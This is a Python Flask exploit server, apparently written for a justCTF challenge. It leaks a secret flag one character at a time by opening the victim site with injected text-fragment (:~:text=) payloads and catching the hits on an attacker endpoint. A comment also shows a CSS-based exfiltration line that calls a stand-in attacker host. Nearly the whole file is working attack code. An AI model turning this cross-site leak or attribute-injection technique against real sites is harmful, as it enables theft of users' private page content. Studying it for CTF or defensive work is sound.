from flask import Flask
from flask import request
import sys
import string

app = Flask(__name__)

#http://192.168.69.69:5000/consent/2?link=%3A~%3Atext%3DHello%22+class%3D%22lg-cc+lg-cc__button_type_clear%22
#myk = window.open('{VICTIM}/:~:text='+e+`&css=${{encodeURIComponent(':target::before {{ content : url({ATTACKER}/receive/')}}`+e+`${{encodeURIComponent(') }}')}}`);      

hit = False
won = False
i = 0
flag = "justCTF{"

#http://192.168.69.69:5000/consent/2?link=%3A~%3Atext%3Dl-%2Co%2C%2C%2C-h%22%20class%3D%22lg-cc%20lg-cc__button_type_clear%22#:~:text=l-,o,%2C,-h

all_chars = string.ascii_lowercase + '_' + '}'

VICTIM = "http://192.168.69.69:5000"
ATTACKER = "http://attacker:1337"

"""
#:~:text=[prefix-,]textStart[,textEnd][,-suffix]
          context  |-------match-----|  context
"""

def gen_redirect(c):
    global flag
    payload = f"""
    <script>
        const c = "{c}"; 
        var flag = "{flag}";
        const sleep = d => new Promise(r=>setTimeout(r,d));
        
        window.onload = async () => {{
            payload = `:~:text=${{flag}}-,${{c}}" class="lg-cc lg-cc__button_type_clear"`;
            myk = window.open('{VICTIM}/consent/2?link='+encodeURIComponent(payload));
            myk.focus();
            await sleep(100);
            myk.close();
            location="/";
        }}
    </script>
    """
    return payload

@app.route('/')
def redirect():
    global hit, i
    i+=1
    print("Current char:", all_chars[i-1])
    return gen_redirect(all_chars[i-1]) if (not won and len(all_chars)>i) else "Thank you for cooperation"

@app.route('/hit')
def receiver():
    global hit, i, flag
    hit = True
    leaked = all_chars[i-1]
    if leaked == "}":
        won = True
    flag+=leaked
    i=0
    print("Current flag:", flag)
    return "ok"
